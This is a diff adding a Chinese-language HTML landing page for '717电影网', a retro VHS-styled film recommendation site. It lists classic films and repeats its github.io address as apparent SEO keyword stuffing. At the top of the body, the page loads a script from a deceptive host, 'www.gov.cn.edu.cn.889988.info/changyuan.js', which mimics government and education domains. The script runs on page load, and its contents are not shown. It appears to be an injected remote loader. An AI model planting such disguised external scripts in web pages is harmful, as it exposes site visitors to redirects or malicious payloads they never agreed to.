@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>717电影网 - 复古电影放映室</title>
+<meta name="description" content="717电影网(717dianyingwang-top.github.io)是一个复古VHS风格的独立电影推荐平台，提供录像带展柜、频道分类、播放列表和关于我们等栏目，网址：https://717dianyingwang-top.github.io">
+<meta name="keywords" content="717电影网, 717dianyingwang-top, 复古电影, VHS风格, 独立电影, 录像带推荐">
+<meta name="author" content="717电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<style>
+/* ===== 全局 ===== */
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Courier New','Monaco',monospace;
+  background:#0a0a1a;
+  color:#e0e0ff;
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+a{text-decoration:none;color:#00ffcc;transition:all .3s}
+a:hover{color:#ff00ff;text-shadow:0 0 10px #ff00ff}
+.container{width:92%;max-width:1200px;margin:0 auto}
+
+/* ===== CRT扫描线背景 ===== */
+body::before{
+  content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.15) 2px,rgba(0,0,0,0.15) 4px);
+}
+
+/* ===== 导航 ===== */
+.navbar{
+  position:fixed;top:0;width:100%;z-index:100;
+  background:rgba(10,10,26,0.95);
+  border-bottom:2px solid #00ffcc;
+  box-shadow:0 0 20px rgba(0,255,204,0.3);
+}
+.nav-in{display:flex;justify-content:space-between;align-items:center;padding:1rem 0}
+.logo{font-size:1.6rem;font-weight:900;color:#00ffcc;text-shadow:0 0 10px #00ffcc;letter-spacing:3px}
+.logo span{color:#ff00ff;text-shadow:0 0 10px #ff00ff}
+.nav-links{display:flex;gap:1.5rem}
+.nav-links a{font-weight:700;font-size:.85rem;text-transform:uppercase;padding:.4rem .8rem;border:1px solid transparent}
+.nav-links a:hover{border-color:#ff00ff;text-shadow:0 0 8px #ff00ff}
+.mob-btn{display:none;background:transparent;border:2px solid #00ffcc;color:#00ffcc;font-size:1.2rem;padding:.3rem .8rem;cursor:pointer;text-shadow:0 0 5px #00ffcc}
+
+/* ===== 首页 ===== */
+.hero{
+  min-height:100vh;display:flex;align-items:center;padding-top:80px;
+  background:
+    radial-gradient(ellipse at center,rgba(0,255,204,0.05),transparent 70%),
+    linear-gradient(180deg,#0a0a1a,#1a0a2a);
+}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center}
+.hero-text h1{
+  font-size:clamp(2.5rem,7vw,5.5rem);font-weight:900;line-height:1;margin-bottom:1.5rem;
+  text-transform:uppercase;letter-spacing:-1px;
+}
+.hero-text h1 .cyan{color:#00ffcc;text-shadow:0 0 20px #00ffcc}
+.hero-text h1 .magenta{color:#ff00ff;text-shadow:0 0 20px #ff00ff}
+.hero-url{
+  display:inline-block;padding:1rem 1.5rem;border:2px solid #00ffcc;background:rgba(0,255,204,0.1);
+  font-family:monospace;font-size:1rem;color:#00ffcc;text-shadow:0 0 5px #00ffcc;margin-bottom:1.5rem;
+}
+.hero-desc{font-size:1rem;margin-bottom:2rem;max-width:500px;color:#c0c0ff}
+.hero-btn{
+  display:inline-block;padding:1rem 2.5rem;border:2px solid #ff00ff;background:rgba(255,0,255,0.1);
+  color:#ff00ff;font-weight:900;text-transform:uppercase;letter-spacing:2px;
+  box-shadow:0 0 15px rgba(255,0,255,0.3);
+}
+.hero-btn:hover{background:#ff00ff;color:#0a0a1a;box-shadow:0 0 30px rgba(255,0,255,0.6)}
+
+/* VHS磁带视觉 */
+.vhs-tape{
+  border:3px solid #333;background:#1a1a2a;border-radius:8px;padding:2rem;
+  position:relative;box-shadow:0 0 30px rgba(0,255,204,0.2);
+}
+.vhs-label{
+  background:#ff00ff;color:#0a0a1a;padding:1rem;text-align:center;font-weight:900;
+  font-size:1.5rem;letter-spacing:5px;margin-bottom:1.5rem;
+}
+.vhs-window{
+  display:flex;justify-content:space-between;align-items:center;background:#0a0a1a;
+  padding:1.5rem;border-radius:4px;margin-bottom:1.5rem;
+}
+.vhs-reel{
+  width:80px;height:80px;border-radius:50%;border:4px solid #333;position:relative;
+  background:repeating-conic-gradient(#222 0deg 30deg,#111 30deg 60deg);
+}
+.vhs-reel::after{
+  content:'';position:absolute;top:50%;left:50%;width:20px;height:20px;
+  background:#00ffcc;border-radius:50%;transform:translate(-50%,-50%);
+  box-shadow:0 0 10px #00ffcc;
+}
+.vhs-info{font-size:.8rem;color:#00ffcc;text-align:center;line-height:2}
+.vhs-info span{display:block;color:#ff00ff}
+
+/* ===== 通用栏目 ===== */
+.section{padding:5rem 0;border-bottom:1px solid #333}
+.section-head{margin-bottom:3rem;text-align:center}
+.section-head h2{
+  font-size:2.5rem;font-weight:900;text-transform:uppercase;letter-spacing:2px;
+  color:#00ffcc;text-shadow:0 0 10px #00ffcc;
+}
+.section-head p{font-size:1rem;color:#8888aa;margin-top:.5rem}
+
+/* ===== 斜切角卡片 ===== */
+.tape-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:2rem}
+.tape-card{
+  border:2px solid #333;background:#111122;padding:0;transition:all .3s;position:relative;
+  clip-path:polygon(15px 0,100% 0,100% calc(100% - 15px),calc(100% - 15px) 100%,0 100%,0 15px);
+}
+.tape-card:hover{border-color:#00ffcc;box-shadow:0 0 25px rgba(0,255,204,0.3);transform:translateY(-5px)}
+.tape-cover{height:180px;display:flex;align-items:center;justify-content:center;font-size:4rem;border-bottom:2px solid #333}
+.tape-card:nth-child(1) .tape-cover{background:linear-gradient(135deg,#1a0033,#330066)}
+.tape-card:nth-child(2) .tape-cover{background:linear-gradient(135deg,#003333,#006666)}
+.tape-card:nth-child(3) .tape-cover{background:linear-gradient(135deg,#330033,#660066)}
+.tape-card:nth-child(4) .tape-cover{background:linear-gradient(135deg,#333300,#666600)}
+.tape-card:nth-child(5) .tape-cover{background:linear-gradient(135deg,#003366,#0066cc)}
+.tape-card:nth-child(6) .tape-cover{background:linear-gradient(135deg,#330000,#660000)}
+.tape-body{padding:1.5rem}
+.tape-body h3{font-size:1.2rem;font-weight:900;color:#00ffcc;margin-bottom:.5rem;text-shadow:0 0 5px #00ffcc}
+.tape-body p{font-size:.85rem;color:#a0a0cc;margin-bottom:1rem}
+.tape-tag{display:inline-block;padding:.2rem .8rem;border:1px solid #ff00ff;color:#ff00ff;font-size:.75rem;text-transform:uppercase}
+
+/* ===== 栏目二：频道分类（霓虹网格）===== */
+.channels{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem}
+.channel{
+  border:2px solid #333;background:#0d0d1a;padding:2rem 1rem;text-align:center;transition:all .3s;
+}
+.channel:hover{border-color:#ff00ff;background:#1a0a2a;box-shadow:0 0 20px rgba(255,0,255,0.2)}
+.channel .ch-num{font-size:2rem;font-weight:900;color:#333;margin-bottom:.5rem}
+.channel:hover .ch-num{color:#ff00ff;text-shadow:0 0 10px #ff00ff}
+.channel h3{font-size:1rem;font-weight:900;color:#00ffcc;margin-bottom:.3rem}
+.channel p{font-size:.75rem;color:#666688}
+
+/* ===== 栏目三：播放列表 ===== */
+.playlist{max-width:800px;margin:0 auto}
+.pl-item{
+  display:flex;align-items:center;gap:1.5rem;padding:1.5rem;border:1px solid #333;background:#111122;
+  margin-bottom:1rem;transition:all .3s;
+}
+.pl-item:hover{border-color:#00ffcc;padding-left:2rem;box-shadow:0 0 15px rgba(0,255,204,0.15)}
+.pl-time{font-size:.8rem;color:#ff00ff;font-weight:700;min-width:60px}
+.pl-info{flex:1}
+.pl-info h3{font-size:1.1rem;font-weight:900;color:#00ffcc;margin-bottom:.3rem}
+.pl-info p{font-size:.8rem;color:#8888aa}
+.pl-duration{font-size:.8rem;color:#666;font-family:monospace}
+
+/* ===== 栏目四：关于我们 ===== */
+.about{max-width:800px;margin:0 auto;border:2px solid #00ffcc;background:rgba(0,255,204,0.03);padding:3rem;position:relative}
+.about::before{
+  content:'▶';position:absolute;top:-15px;left:2rem;background:#0a0a1a;padding:0 1rem;
+  color:#ff00ff;font-size:1.5rem;text-shadow:0 0 10px #ff00ff;
+}
+.about h3{font-size:1.8rem;font-weight:900;color:#00ffcc;text-shadow:0 0 10px #00ffcc;margin-bottom:1.5rem}
+.about p{font-size:1rem;color:#c0c0ff;margin-bottom:1rem}
+.about-url{
+  display:inline-block;margin-top:1rem;padding:1rem 2rem;border:2px dashed #ff00ff;color:#ff00ff;font-family:monospace;
+  text-shadow:0 0 5px #ff00ff;
+}
+.about-url:hover{background:#ff00ff;color:#0a0a1a;text-shadow:none}
+
+/* ===== 底部 ===== */
+.footer{background:#050510;padding:3rem 0;text-align:center;border-top:2px solid #333}
+.footer-brand{font-size:1.8rem;font-weight:900;color:#00ffcc;text-shadow:0 0 10px #00ffcc;margin-bottom:1rem}
+.footer-brand span{color:#ff00ff;text-shadow:0 0 10px #ff00ff}
+.footer p{font-size:.85rem;color:#666688;margin-bottom:.5rem}
+.footer-nav{display:flex;justify-content:center;gap:1.5rem;margin:1.5rem 0;flex-wrap:wrap}
+.footer-nav a{border:1px solid #333;padding:.5rem 1rem;font-size:.8rem;text-transform:uppercase}
+.footer-nav a:hover{border-color:#00ffcc;color:#00ffcc;text-shadow:0 0 5px #00ffcc}
+.footer-copy{font-size:.75rem;color:#444466;margin-top:2rem;padding-top:1.5rem;border-top:1px solid #222}
+
+/* ===== 移动端 ===== */
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:100%;left:0;width:100%;flex-direction:column;background:#0a0a1a;border-bottom:2px solid #00ffcc;padding:1rem 0}
+  .nav-links.open{display:flex}
+  .nav-links a{text-align:center;padding:1rem;border-bottom:1px solid #222}
+  .mob-btn{display:block}
+  .hero-grid{grid-template-columns:1fr}
+  .hero-text h1{font-size:3rem}
+  .vhs-tape{order:-1}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<div class="navbar">
+  <div class="container nav-in">
+    <div class="logo">717<span>电影网</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">HOME</a>
+      <a href="#tapes">TAPES</a>
+      <a href="#channels">CHANNELS</a>
+      <a href="#playlist">PLAYLIST</a>
+      <a href="#about">ABOUT</a>
+    </nav>
+    <button class="mob-btn" onclick="document.getElementById('navLinks').classList.toggle('open')">▶</button>
+  </div>
+</div>
+
+<!-- 首页 -->
+<section id="home" class="hero">
+  <div class="container hero-grid">
+    <div class="hero-text">
+      <h1><span class="cyan">717</span><br><span class="magenta">电影网</span></h1>
+      <div class="hero-url">🔗 https://717dianyingwang-top.github.io</div>
+      <p class="hero-desc">717电影网(717dianyingwang-top.github.io)是一个复古VHS风格的独立电影推荐平台。把时光倒带回80年代，在录像带的温暖噪点中，重新发现电影的魅力。</p>
+      <a href="#tapes" class="hero-btn">▶ PLAY</a>
+    </div>
+    <div class="vhs-tape">
+      <div class="vhs-label">VHS ▸ 717</div>
+      <div class="vhs-window">
+        <div class="vhs-reel"></div>
+        <div class="vhs-reel"></div>
+      </div>
+      <div class="vhs-info">
+        <span>SP ▸ 717 MIN</span>
+        Hi-Fi STEREO<br>
+        <span>▶ INSERT TAPE</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：录像带展柜 -->
+<section id="tapes" class="section">
+  <div class="container">
+    <div class="section-head">
+      <h2>◉ 录像带展柜</h2>
+      <p>每一盘磁带，都是一段被封存的时光</p>
+    </div>
+    <div class="tape-grid">
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>低俗小说</h3>
+          <p>昆汀的非线性叙事经典，黑色幽默的巅峰之作。</p>
+          <span class="tape-tag">犯罪/黑色幽默</span>
+        </div>
+      </div>
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>发条橙</h3>
+          <p>库布里克的禁片之王，关于暴力与自由的终极拷问。</p>
+          <span class="tape-tag">科幻/犯罪</span>
+        </div>
+      </div>
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>银翼杀手</h3>
+          <p>赛博朋克的鼻祖，雨夜霓虹中的存在主义思考。</p>
+          <span class="tape-tag">科幻/新黑色</span>
+        </div>
+      </div>
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>出租车司机</h3>
+          <p>斯科塞斯的纽约夜曲，孤独者的精神独白。</p>
+          <span class="tape-tag">剧情/犯罪</span>
+        </div>
+      </div>
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>2001太空漫游</h3>
+          <p>库布里克的太空史诗，人类进化的哲学寓言。</p>
+          <span class="tape-tag">科幻/哲学</span>
+        </div>
+      </div>
+      <div class="tape-card">
+        <div class="tape-cover">📼</div>
+        <div class="tape-body">
+          <h3>闪灵</h3>
+          <p>斯蒂芬·金的恐怖经典，孤立酒店中的疯狂蔓延。</p>
+          <span class="tape-tag">恐怖/悬疑</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：频道分类 -->
+<section id="channels" class="section" style="background:#080815">
+  <div class="container">
+    <div class="section-head">
+      <h2>◉ 频道分类</h2>
+      <p>切换频道，发现不同类型的经典</p>
+    </div>
+    <div class="channels">
+      <div class="channel"><div class="ch-num">CH.1</div><h3>午夜场</h3><p>cult/恐怖</p></div>
+      <div class="channel"><div class="ch-num">CH.2</div><h3>黑色电影</h3><p>film noir</p></div>
+      <div class="channel"><div class="ch-num">CH.3</div><h3>新浪潮</h3><p>French New Wave</p></div>
+      <div class="channel"><div class="ch-num">CH.4</div><h3>意大利</h3><p>通心粉西部</p></div>
+      <div class="channel"><div class="ch-num">CH.5</div><h3>香港</h3><p>港片经典</p></div>
+      <div class="channel"><div class="ch-num">CH.6</div><h3>日本</h3><p>日影精选</p></div>
+      <div class="channel"><div class="ch-num">CH.7</div><h3>实验</h3><p>先锋影像</p></div>
+      <div class="channel"><div class="ch-num">CH.8</div><h3>纪录</h3><p>真实影像</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：播放列表 -->
+<section id="playlist" class="section">
+  <div class="container">
+    <div class="section-head">
+      <h2>◉ 播放列表</h2>
+      <p>今日放映日程</p>
+    </div>
+    <div class="playlist">
+      <div class="pl-item">
+        <div class="pl-time">09:00</div>
+        <div class="pl-info">
+          <h3>早餐俱乐部</h3>
+          <p>五个高中生的周六 detention，青春群像经典。</p>
+        </div>
+        <div class="pl-duration">97 MIN</div>
+      </div>
+      <div class="pl-item">
+        <div class="pl-time">11:30</div>
+        <div class="pl-info">
+          <h3>回到未来</h3>
+          <p>时间旅行的终极乐趣，80年代最完美的娱乐片。</p>
+        </div>
+        <div class="pl-duration">116 MIN</div>
+      </div>
+      <div class="pl-item">
+        <div class="pl-time">14:00</div>
+        <div class="pl-info">
+          <h3>驱魔人</h3>
+          <p>史上最恐怖电影之一，至今仍是恐怖片的标杆。</p>
+        </div>
+        <div class="pl-duration">122 MIN</div>
+      </div>
+      <div class="pl-item">
+        <div class="pl-time">16:30</div>
+        <div class="pl-info">
+          <h3>落水狗</h3>
+          <p>昆汀的导演处女作，非线性叙事的开端。</p>
+        </div>
+        <div class="pl-duration">99 MIN</div>
+      </div>
+      <div class="pl-item">
+        <div class="pl-time">19:00</div>
+        <div class="pl-info">
+          <h3>好家伙</h3>
+          <p>黑帮电影的教科书级作品，马丁·斯科塞斯巅峰。</p>
+        </div>
+        <div class="pl-duration">145 MIN</div>
+      </div>
+      <div class="pl-item">
+        <div class="pl-time">22:00</div>
+        <div class="pl-info">
+          <h3>大开眼戒</h3>
+          <p>库布里克遗作，神秘仪式与婚姻危机的交织。</p>
+        </div>
+        <div class="pl-duration">159 MIN</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于我们 -->
+<section id="about" class="section" style="background:#080815">
+  <div class="container">
+    <div class="about">
+      <h3>关于 717电影网</h3>
+      <p>717电影网（网址：https://717dianyingwang-top.github.io）是一个复古VHS风格的独立电影推荐平台。在数字流媒体的时代，我们怀念录像带时代的仪式感。</p>
+      <p>每一部电影都像一盘磁带，有它的温度、它的噪点、它独一无二的质感。717电影网致力于推荐那些在数字洪流中容易被忽略的经典独立电影、cult经典和修复版老片。</p>
+      <p>717电影网——在噪点中，看见经典。</p>
+      <a href="#" class="about-url">🌐 https://717dianyingwang-top.github.io</a>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-brand">717<span>电影网</span></div>
+    <p>网址：https://717dianyingwang-top.github.io</p>
+    <p>关键词：717电影网 / 717dianyingwang-top</p>
+    <div class="footer-nav">
+      <a href="#home">HOME</a>
+      <a href="#tapes">TAPES</a>
+      <a href="#channels">CHANNELS</a>
+      <a href="#playlist">PLAYLIST</a>
+      <a href="#about">ABOUT</a>
+    </div>
+    <div class="footer-copy">▸ TRACKING #717 ▸ © 2026 717电影网(717dianyingwang-top) · 示例展示页 · 内链使用 # 占位</div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('open'));
+});
+</script>
+</body>
+</html>
